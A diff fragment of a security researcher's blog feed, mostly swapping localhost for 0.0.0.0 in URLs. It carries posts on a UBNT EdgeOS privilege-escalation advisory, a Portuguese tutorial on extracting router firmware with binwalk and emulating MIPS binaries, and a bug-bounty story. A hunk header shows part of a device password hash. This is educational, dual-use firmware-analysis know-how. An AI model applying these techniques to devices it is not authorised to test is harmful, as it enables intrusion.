   &lt;li&gt;&lt;a href=&quot;https://community.ubnt.com/t5/EdgeMAX-Updates-Blog/EdgeMAX-EdgeRouter-software-security-release-v1-9-7-hotfix-3/ba-p/2054117&quot;&gt;UBNT Software Release Note&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="ubnt" /><category term="cve" /><summary type="html">UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Emulando binários dos firmwares</title><link href="http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html" rel="alternate" type="text/html" title="Embedded Hacking: Emulando binários dos firmwares" /><published>2018-02-19T00:00:00-03:00</published><updated>2018-02-19T00:00:00-03:00</updated><id>http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html">&lt;p&gt;Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o &lt;em&gt;DSL-100HN-T1-NV&lt;/em&gt;, &lt;a href=&quot;/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html&quot;&gt;extraído diretamente da memória flash&lt;/a&gt; do aparelho.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="advisories" /><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="ubnt" /><category term="cve" /><summary type="html">UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Emulando binários dos firmwares</title><link href="http://0.0.0.0:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html" rel="alternate" type="text/html" title="Embedded Hacking: Emulando binários dos firmwares" /><published>2018-02-19T00:00:00-03:00</published><updated>2018-02-19T00:00:00-03:00</updated><id>http://0.0.0.0:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios</id><content type="html" xml:base="http://0.0.0.0:4000/embedded-hacking/2018/02/19/embedded-hacking-emulando-binarios.html">&lt;p&gt;Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o &lt;em&gt;DSL-100HN-T1-NV&lt;/em&gt;, &lt;a href=&quot;/embedded-hacking/2018/01/25/iot-hacking-extracao-de-firmware-usando-spi.html&quot;&gt;extraído diretamente da memória flash&lt;/a&gt; do aparelho.&lt;/p&gt;
 
 &lt;h2 id=&quot;o-dump-do-firmware&quot;&gt;O dump do Firmware&lt;/h2&gt;
 
@@ -507,9 +507,9 @@ operator:$6$7SVNi.WB68V0QR5t$efMoCyT2H.mEU6M8s2NDSsW1fv7JnT2eAfK2VxuzsIdcYrEvWCI
 
 &lt;p&gt;O &lt;a href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;binwalk&lt;/a&gt; é uma ferramente utilizada para análise, extração e engenharia reversa de firmwares. Ela possui dezenas de funcionalidades, desde a extração de firmware, disassembly de código (utilizando o &lt;a href=&quot;http://www.capstone-engine.org/&quot;&gt;capstone&lt;/a&gt;) e análise de entropia, muito útil para identificar se todo ou parte de um arquivo está criptografado ou compactado.&lt;/p&gt;
 
-&lt;p&gt;Basicamente quando queremos saber o tipo de um arquivo desconhecido nós utilizamos o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; passando o arquivo como argumento. Esse comando possui uma base de assinatura (aka &lt;code class=&quot;highlighter-rouge&quot;&gt;magic numbers&lt;/code&gt;) de binários e utiliza essa base de assinatura para verificar o tipo do arquivo. Porém o comando file faz o match da assinatura no começo do arquivo, diferente da ferramenta binwalk.&lt;/p&gt;
+&lt;p&gt;Basicamente quando queremos saber o tipo de um arquivo desconhecido nós utilizamos o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; passando o arquivo como argumento. Esse comando possui uma base de assinatura (aka &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic numbers&lt;/code&gt;) de binários e utiliza essa base de assinatura para verificar o tipo do arquivo. Porém o comando file faz o match da assinatura no começo do arquivo, diferente da ferramenta binwalk.&lt;/p&gt;
 
-&lt;p&gt;Além de ter uma base de assinatura mais específica e complexa, o binwalk percorre todo o binário procurando por formatos conhecidos, como bootloaders, sistemas de arquivos, imagens compactadas etc. Além disso, é possível extrair esse conteúdo (ao invés de fazer na mão com o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;dd&lt;/code&gt;) e, caso necessário, fazer esse processo de extração de maneira recursiva.&lt;/p&gt;
+&lt;p&gt;Além de ter uma base de assinatura mais específica e complexa, o binwalk percorre todo o binário procurando por formatos conhecidos, como bootloaders, sistemas de arquivos, imagens compactadas etc. Além disso, é possível extrair esse conteúdo (ao invés de fazer na mão com o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt;) e, caso necessário, fazer esse processo de extração de maneira recursiva.&lt;/p&gt;
 
 &lt;p&gt;Por exemplo, supomos que uma imagem de um firmware possui um sistema de arquivos compactado, e nesse sistema de arquivos possui um arquivo compactado com tar.gz. O binwalk com os argumentos certos iria identificar e extrair o sistema de arquivos principal e, então, identificar e extrair o arquivo tar.gz compactado.&lt;/p&gt;
 
@@ -521,7 +521,7 @@ operator:$6$7SVNi.WB68V0QR5t$efMoCyT2H.mEU6M8s2NDSsW1fv7JnT2eAfK2VxuzsIdcYrEvWCI
 &lt;p&gt;Caso esteja utilizando alguma outra distribuição, verifique nos repositórios oficiais se a ferramenta está disponível. Caso contrário, a instalação a partir do github seria a melhor alternativa.&lt;/p&gt;
 
 &lt;p&gt;Abaixo temos a lista completa de opções disponíveis na ferramenta:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Binwalk v2.1.1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Binwalk v2.1.1
 Craig Heffner, http://www.binwalk.org
 
 Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
@@ -529,7 +529,7 @@ Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
 Disassembly Scan Options:
     -Y, --disasm                 Identify the CPU architecture of a file using the capstone disassembler
     -T, --minsn=&amp;lt;int&amp;gt;            Minimum number of consecutive instructions to be considered valid (default: 500)
-    -k, --continue               Don't stop at the first match
+    -k, --continue               Don&apos;t stop at the first match
 
 Signature Scan Options:
     -B, --signature              Scan target file(s) for common file signatures
@@ -550,7 +550,7 @@ Extraction Options:
     -j, --size=&amp;lt;int&amp;gt;             Limit the size of each extracted file
     -n, --count=&amp;lt;int&amp;gt;            Limit the number of extracted files
     -r, --rm                     Delete carved files after extraction
-    -z, --carve                  Carve data from files, but don't execute extraction utilities
+    -z, --carve                  Carve data from files, but don&apos;t execute extraction utilities
 
 Entropy Analysis Options:
     -E, --entropy                Calculate file entropy
@@ -594,12 +594,12 @@ General Options:
 
 &lt;h2 id=&quot;extração-do-firmware&quot;&gt;Extração do firmware&lt;/h2&gt;
 
-&lt;p&gt;Para extrair o sistema de arquivos do firmware do nosso device, iremos executar o binwalk com o argumento -e (de &lt;code class=&quot;highlighter-rouge&quot;&gt;extract&lt;/code&gt;) no dump da memória flash, extraída por SPI na publicação anterior. Caso você esteja analisando algum outro firmware obtido por outro meio (ex: página de download do fabricante), o procedimento seria o mesmo.&lt;/p&gt;
+&lt;p&gt;Para extrair o sistema de arquivos do firmware do nosso device, iremos executar o binwalk com o argumento -e (de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extract&lt;/code&gt;) no dump da memória flash, extraída por SPI na publicação anterior. Caso você esteja analisando algum outro firmware obtido por outro meio (ex: página de download do fabricante), o procedimento seria o mesmo.&lt;/p&gt;
 
 &lt;p&gt;Abaixo é possível ver o processo de extração e o resultado obtido:&lt;/p&gt;
 &lt;asciinema-player src=&quot;/assets/cast/binwalk-extract.json&quot; rows=&quot;20&quot; preload=&quot;true&quot; poster=&quot;npt:0:22&quot;&gt;&lt;/asciinema-player&gt;
 
-&lt;p&gt;A imagem do firmware contém alguns elementos. Porém o que nos interessa a princípio é o sistema de arquivos Squashfs. O binwalk com o arquivo &lt;code class=&quot;highlighter-rouge&quot;&gt;-e&lt;/code&gt; já extrai e monta o sistema de arquivos, e ao acessar a pasta destino foi possível ver os arquivos do dispositivo. Nessa etapa já é possível comectar a procurar por alguns ítens interessantes, como por exemplo:&lt;/p&gt;
+&lt;p&gt;A imagem do firmware contém alguns elementos. Porém o que nos interessa a princípio é o sistema de arquivos Squashfs. O binwalk com o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; já extrai e monta o sistema de arquivos, e ao acessar a pasta destino foi possível ver os arquivos do dispositivo. Nessa etapa já é possível comectar a procurar por alguns ítens interessantes, como por exemplo:&lt;/p&gt;
 &lt;ul&gt;
   &lt;li&gt;Serviços inicializando&lt;/li&gt;
   &lt;li&gt;Usuários não documentados&lt;/li&gt;
@@ -612,29 +612,29 @@ General Options:
 
 &lt;p&gt;Uma coisa muito interessante para se fazer é executar os binários disponíveis no firmware para uma análise dinâmica prévia. Isso pode ser útil para identificar vulnerabilidades e/ou simplesmente analisar o funcionamento de alguma aplicação legacy disponível no firmware.&lt;/p&gt;
 
-&lt;p&gt;Para a execução de binários, temos que identificar a arquitetura do dispositivo. Geralmente a arquitetura é MIPS ou ARM, mas para tira a dúvida basta executar o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; em algum dos binários disponíveis no sistema de arquivos do firware.&lt;/p&gt;
+&lt;p&gt;Para a execução de binários, temos que identificar a arquitetura do dispositivo. Geralmente a arquitetura é MIPS ou ARM, mas para tira a dúvida basta executar o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; em algum dos binários disponíveis no sistema de arquivos do firware.&lt;/p&gt;
 
-&lt;p&gt;Abaixo o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; comprova que estamos trabalhando com um dispositivo com arquitetura MIPS:&lt;/p&gt;
+&lt;p&gt;Abaixo o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; comprova que estamos trabalhando com um dispositivo com arquitetura MIPS:&lt;/p&gt;
 
 &lt;asciinema-player src=&quot;/assets/cast/file-binary.json&quot; rows=&quot;10&quot; preload=&quot;true&quot; poster=&quot;npt:0:8&quot;&gt;&lt;/asciinema-player&gt;
 
-&lt;p&gt;Para executar os binários, vamos utilizar uma combinação do &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu&lt;/code&gt;. O chroot irá alterar o root do sistema para o root do sistema de arquivos do firmware. Dessa forma todas as bibliotecas (também MIPS) e arquivos de configuração estarão disponíveis. Já o qemu irá executar o binário propriamente dito. Porém para isto o qemu deve ser compilado de maneira estática, para não depender de qualquer biblioteca que esteja fora do ambiente chroot. No archlinux existe um pacote AUR chamado &lt;a href=&quot;https://aur.archlinux.org/packages/qemu-user-static/&quot;&gt;qemu-user-static&lt;/a&gt;, que contém o QEMU compilado de maneira estática para diversas arquiteturas diferentes.&lt;/p&gt;
+&lt;p&gt;Para executar os binários, vamos utilizar uma combinação do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qemu&lt;/code&gt;. O chroot irá alterar o root do sistema para o root do sistema de arquivos do firmware. Dessa forma todas as bibliotecas (também MIPS) e arquivos de configuração estarão disponíveis. Já o qemu irá executar o binário propriamente dito. Porém para isto o qemu deve ser compilado de maneira estática, para não depender de qualquer biblioteca que esteja fora do ambiente chroot. No archlinux existe um pacote AUR chamado &lt;a href=&quot;https://aur.archlinux.org/packages/qemu-user-static/&quot;&gt;qemu-user-static&lt;/a&gt;, que contém o QEMU compilado de maneira estática para diversas arquiteturas diferentes.&lt;/p&gt;
 
-&lt;p&gt;Para executar os binários MIPS do firmware primeiramente copiamos o binário estático do qemu para arquitetura MIPS (no caso &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu-mips-static&lt;/code&gt;) para dentro do squashfs-root e, então, executamos o binário copiado dentro de um ambiente de chroot.&lt;/p&gt;
+&lt;p&gt;Para executar os binários MIPS do firmware primeiramente copiamos o binário estático do qemu para arquitetura MIPS (no caso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qemu-mips-static&lt;/code&gt;) para dentro do squashfs-root e, então, executamos o binário copiado dentro de um ambiente de chroot.&lt;/p&gt;
 
 &lt;p&gt;O vídeo abaixo demostra a execução do binário MIPS de listagem de arquivos (ls):&lt;/p&gt;
 &lt;asciinema-player src=&quot;/assets/cast/qemu-embedded-binary.json&quot; rows=&quot;20&quot; preload=&quot;true&quot; poster=&quot;npt:0:2&quot;&gt;&lt;/asciinema-player&gt;
 
 &lt;h2 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h2&gt;
 
-&lt;p&gt;Apesar dessa publicação ter sido razoavelmente simples, acredito que a utilização do &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;highlighter-rouge&quot;&gt;qemu&lt;/code&gt; para análise dinâmica de binários seja extremamente útil. Porém, infelizmente, nem todos os binário executam com sucesso através desse método. Isso ocorre pelo motivo óbvio que o qemu não emula o hardware completo do nosso dispositivo embarcado. Entretanto a maioria das dificuldades conseguem ser contornadas utilizando alguns artifícios como uma melhoria no setup do ambiente (ex: montar o &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc&lt;/code&gt; e o &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev&lt;/code&gt;), seja mudando algum arquivo de configuração, seja rodando o binário com LD_PRELOAD para burlar algumas chamadas específicas de biblioteca (ex: acesso a &lt;code class=&quot;highlighter-rouge&quot;&gt;nvram&lt;/code&gt;) ou, no pior caso, fazendo um patch no binário em execução.&lt;/p&gt;
+&lt;p&gt;Apesar dessa publicação ter sido razoavelmente simples, acredito que a utilização do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chroot&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;qemu&lt;/code&gt; para análise dinâmica de binários seja extremamente útil. Porém, infelizmente, nem todos os binário executam com sucesso através desse método. Isso ocorre pelo motivo óbvio que o qemu não emula o hardware completo do nosso dispositivo embarcado. Entretanto a maioria das dificuldades conseguem ser contornadas utilizando alguns artifícios como uma melhoria no setup do ambiente (ex: montar o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt; e o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev&lt;/code&gt;), seja mudando algum arquivo de configuração, seja rodando o binário com LD_PRELOAD para burlar algumas chamadas específicas de biblioteca (ex: acesso a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nvram&lt;/code&gt;) ou, no pior caso, fazendo um patch no binário em execução.&lt;/p&gt;
 
 &lt;p&gt;Recomendo aos que estão acompanhando a série a praticarem com algum dispositivo que possuem ou a escolherem algum firmware na internet para seguir o processo. Caso tenham qualquer dúvida ou comentário basta entrar em contato ou utilizar os campos de comentário no final da página.&lt;/p&gt;
 
 &lt;p&gt;Cheers,&lt;/p&gt;
 
 &lt;p&gt;Maycon Vitali&lt;br /&gt;
-Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="qemu" /><category term="mips" /><summary type="html">Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o DSL-100HN-T1-NV, extraído diretamente da memória flash do aparelho.</summary></entry><entry xml:lang="en"><title type="html">Talk is cheap. Show me the money!</title><link href="http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-02-03T00:00:00-02:00</published><updated>2018-02-03T00:00:00-02:00</updated><id>http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en</id><content type="html" xml:base="http://localhost:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html">&lt;p&gt;The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.&lt;/p&gt;
+Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-hacking" /><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="qemu" /><category term="mips" /><summary type="html">Seguindo a série sobre hacking de dispositivo embarcados, nessa postagem será demonstrado uma forma simples de iniciar a análise do firmware extraído na postagem anterior. Nessa etapa iremos somente fazer uma análise do firmware, sem acesso ao dispositivo propriamente dito. Isso pode ser útil para identificar vulnerabilidades em firmwares que, por algum motivo, não possuímos o hardware para testes. Para isso continuaremos utilizando como teste o formware dispositivo da MITRASTAR, o DSL-100HN-T1-NV, extraído diretamente da memória flash do aparelho.</summary></entry><entry xml:lang="en"><title type="html">Talk is cheap. Show me the money!</title><link href="http://0.0.0.0:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html" rel="alternate" type="text/html" title="Talk is cheap. Show me the money!" /><published>2018-02-03T00:00:00-02:00</published><updated>2018-02-03T00:00:00-02:00</updated><id>http://0.0.0.0:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en</id><content type="html" xml:base="http://0.0.0.0:4000/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html">&lt;p&gt;The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.&lt;/p&gt;
 
 &lt;h3 id=&quot;what-is-a-bug-bounty-program&quot;&gt;What is a Bug Bounty Program?&lt;/h3&gt;
 
@@ -658,13 +658,13 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 
 &lt;h3 id=&quot;choosing-the-vendor&quot;&gt;Choosing the Vendor&lt;/h3&gt;
 
-&lt;p&gt;As I was already studying embedded security (the &lt;code class=&quot;highlighter-rouge&quot;&gt;IoT hacking&lt;/code&gt; cliche), I found a vendor that fits like a glove, the &lt;a href=&quot;https://hackerone.com/ubnt&quot;&gt;Ubiquiti Networks&lt;/a&gt;. It has clean rules, a well-defined scope, good payment and being looking into the firmware for vulnerabilities would be great. Although H1 has another vendor with good bounties, the good point to choose UBNT was that it pays the bounty once the vulnerability is confirmed, while other vendors, after submitting to vendors we have to wait few days after the security patch.&lt;/p&gt;
+&lt;p&gt;As I was already studying embedded security (the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoT hacking&lt;/code&gt; cliche), I found a vendor that fits like a glove, the &lt;a href=&quot;https://hackerone.com/ubnt&quot;&gt;Ubiquiti Networks&lt;/a&gt;. It has clean rules, a well-defined scope, good payment and being looking into the firmware for vulnerabilities would be great. Although H1 has another vendor with good bounties, the good point to choose UBNT was that it pays the bounty once the vulnerability is confirmed, while other vendors, after submitting to vendors we have to wait few days after the security patch.&lt;/p&gt;
 
 &lt;h3 id=&quot;choosing-the-target&quot;&gt;Choosing the Target&lt;/h3&gt;
 
 &lt;p&gt;The next step was to choose the target. After few researching with friends, I decided to buy online an &lt;a href=&quot;https://produto.mercadolivre.com.br/MLB-811540935-ubiquiti-edgerouter-x-er-x-5-portas-rj45-_JM?source=gps&quot;&gt;EdgeRouter X&lt;/a&gt;, a managed router with interesting features. The router (with the delivery service) cost me about $100.00, but I had in my mind that if I find a simple Cross-site Scripting vulnerability I will earn for about $150.00, and it will be enough to recover the value I paid (and a few profit).&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/edgerouter-ml.png&quot; alt=&quot;EdgeRouter X&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I bought it on Wednesday, 30th May, and the device was delivered almost two weeks later, on 14th July, before a holiday.&lt;/p&gt;
 
@@ -700,7 +700,7 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 
 &lt;p&gt;I was satisfied and happy with the possible $ 250.00 that would be coming. Until I saw the second email saying that I had already been paid. That’s it! In less than 12 hours after I sent my first vulnerability report, it was confirmed and the reward was paid. But the best is still to come. Instead of the $ 250.00 that I was expecting, I was rewarded with $ 1,500.00, which rather than pay the investment in the EdgeRouter that I had bought, would allow me buying another 15 models alike.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;First vulnerability report&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ubnt-primeiro-report.png&quot; alt=&quot;First vulnerability report&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;money-money-and-an-unexpected-invite&quot;&gt;Money, money and an unexpected invite(?)&lt;/h3&gt;
 
@@ -708,7 +708,7 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 
 &lt;p&gt;As I took a liking to the result but did not have much time available out on the weekends, I decided to calm down a bit and just study a little more during the weekends. But on June 15th I received a private message from Ubiquiti inviting me to test a beta device, the [EtherMagic] (https://store.ubnt.com/products/ethermagic). They told me that if I accepted the invite they would send a &lt;strong&gt;free kit&lt;/strong&gt;. This made me happy to realize the company’s recognition of my vulnerability research on their equipment.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Invite&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/invite-beta-test.png&quot; alt=&quot;Invite&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;dont-let-the-samba-die-its-a-brazilian-expression&quot;&gt;Don’t let the samba die (it’s a Brazilian expression)&lt;/h3&gt;
 
@@ -720,7 +720,7 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 
 &lt;p&gt;After two weeks that the new device was posted, it finally arrived into my hands. At first, I was a bit worried about already opening it and going out soldering pinout to UART (I’ll talk about it in a future post) and end up breaking it. After all, if it breaks I could not just open the vendor online store and buy another. But as the device was beta, unfortunately, its support is very limited (maybe we can say it does not exist), and there is no version of its firmware on the vendor download page. Conclusion: I should extract the firmware directly from the device (I’ll also mention it in a future post) to get access to it and the running applications.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ethermagic.png&quot; alt=&quot;EtherMagic&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It was late at night and I was reasonably tired of trying to get access to the device. However, with my hardware knowledge tending to zero, I started playing with its bootloader commands (U-Boot) and, in a miraculous and bad lucky way, I managed to brick with the FLASH memory of the device. #genius&lt;/p&gt;
 
@@ -738,11 +738,11 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 
 &lt;p&gt;The summary of that month I was playing with Bug Bounties were 10 vulnerabilities reported, where one of them was duplicated and the another nine were rewarded with a total of $ 19,800.00:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/h1-extrato.png&quot; alt=&quot;Extrato do HackerOne&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Also as a result of this, I finished 2017 in the fifth place in the “Ranking of Thanks” of Ubiquiti Networks:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ubiquiti Ranking - 2017&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/01/ubnt-thanks.png&quot; alt=&quot;Ubiquiti Ranking - 2017&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
 
@@ -751,7 +751,7 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 &lt;p&gt;Good hunting.&lt;/p&gt;
 
 &lt;p&gt;Maycon Vitali&lt;br /&gt;
-Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.</summary></entry><entry xml:lang="en"><title type="html">I’m back!!</title><link href="http://localhost:4000/hello-world/2018/01/28/im-back-en.html" rel="alternate" type="text/html" title="I'm back!!" /><published>2018-01-28T22:00:00-02:00</published><updated>2018-01-28T22:00:00-02:00</updated><id>http://localhost:4000/hello-world/2018/01/28/im-back-en</id><content type="html" xml:base="http://localhost:4000/hello-world/2018/01/28/im-back-en.html">&lt;p&gt;Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the &lt;a href=&quot;http://www.hacknroll.io&quot;&gt;Hack N’ Roll&lt;/a&gt; one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the &lt;a href=&quot;http://www.hacknroll.com&quot;&gt;old site&lt;/a&gt; to the new one.&lt;/p&gt;
+Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="bug-bounty" /><category term="bug-bounty" /><category term="hackerone" /><category term="ubiquiti" /><summary type="html">The main goal of this post is to incentive the security professionals, hackers and enthusiasts to join the fantastic world of the Bug Bounty programs. You should not expect any technical stuff in this post, but it’s reserved for the future.</summary></entry><entry xml:lang="en"><title type="html">I’m back!!</title><link href="http://0.0.0.0:4000/hello-world/2018/01/28/im-back-en.html" rel="alternate" type="text/html" title="I’m back!!" /><published>2018-01-28T22:00:00-02:00</published><updated>2018-01-28T22:00:00-02:00</updated><id>http://0.0.0.0:4000/hello-world/2018/01/28/im-back-en</id><content type="html" xml:base="http://0.0.0.0:4000/hello-world/2018/01/28/im-back-en.html">&lt;p&gt;Hi guys. I am writing this first post to tell you I’m back to share some technical stuff and, for this reason, I am remaking both my personal site and the &lt;a href=&quot;http://www.hacknroll.io&quot;&gt;Hack N’ Roll&lt;/a&gt; one. Once the new layout is done (maybe the same of this site, because I’m not good with HTML+CSS), I will migrate the posts from the &lt;a href=&quot;http://www.hacknroll.com&quot;&gt;old site&lt;/a&gt; to the new one.&lt;/p&gt;
 
 &lt;p&gt;In this personal page, I intend to provide some material related to:&lt;/p&gt;
 &lt;ul&gt;
@@ -780,7 +780,7 @@ Hack N’ Roll&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><ca
 &lt;p&gt;Unfortunately, the main language of this site will be Brazilian Portuguese. But I will try to rewrite all posts to English as fast I can. Feel free to send me any feedback about the content of this site, including subject, typos, misspelling etc.&lt;/p&gt;
 
 &lt;p&gt;Let’s hack!&lt;br /&gt;
